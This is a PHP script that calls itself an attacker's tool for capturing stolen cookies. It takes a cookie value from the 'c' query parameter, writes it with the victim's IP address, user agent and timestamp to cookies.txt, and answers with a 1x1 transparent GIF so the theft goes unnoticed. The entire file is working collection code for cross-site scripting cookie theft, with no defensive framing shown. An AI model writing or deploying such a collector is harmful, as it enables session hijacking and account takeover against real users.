<?php
// This is the attacker's script to capture stolen cookies.

$logFile = 'cookies.txt';

if (isset($_GET['c'])) {
    $cookie = $_GET['c'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $date = date('Y-m-d H:i:s');
    
    $logEntry = "--- STOLEN COOKIE ---\n";
    $logEntry .= "Date: $date\n";
    $logEntry .= "IP: $ip\n";
    $logEntry .= "User-Agent: $userAgent\n";
    $logEntry .= "Cookie: $cookie\n";
    $logEntry .= "---------------------\n\n";
    
    // Save to cookies.txt (FILE_APPEND will create it if it doesn't exist)
    if (file_put_contents($logFile, $logEntry, FILE_APPEND) === false) {
        // Log error locally if writing fails
        error_log("Failed to write to $logFile. Check folder permissions.");
    }
    
    // Return a 1x1 transparent GIF
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}
?>
